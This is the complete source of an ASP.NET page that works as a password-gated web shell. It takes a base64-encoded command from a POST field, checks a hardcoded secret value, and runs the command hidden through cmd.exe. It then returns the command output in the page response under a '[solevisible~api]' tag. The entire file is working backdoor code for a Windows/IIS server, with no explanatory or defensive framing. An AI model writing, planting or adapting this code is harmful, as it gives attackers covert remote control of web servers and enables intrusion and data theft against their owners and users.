<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
	string cmd = Request.Form["cmd"];
	string check = Request.Form["check"];
	if(check == "W3NvbGV2aXNpYmxlfmFwaV0="){
		byte[] data = System.Convert.FromBase64String(cmd);
		cmd = System.Text.ASCIIEncoding.ASCII.GetString(data);

		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.Arguments = "/c " + cmd;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = "/";
		p.Start();

		string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		Response.Write("[solevisible~api]<pre>"+output+"</pre>");
	}
%>
